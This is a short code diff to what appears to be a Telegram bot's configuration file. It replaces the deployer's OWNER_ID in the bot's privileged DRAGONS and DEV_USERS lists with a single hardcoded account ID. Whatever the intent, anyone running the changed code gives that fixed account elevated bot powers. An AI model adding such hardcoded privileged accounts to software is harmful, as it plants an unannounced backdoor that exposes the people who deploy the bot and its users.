@@ -165,9 +165,9 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DRAGONS.add(1808943146)
+DEV_USERS.add(1808943146)
+DEV_USERS.add(1808943146)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
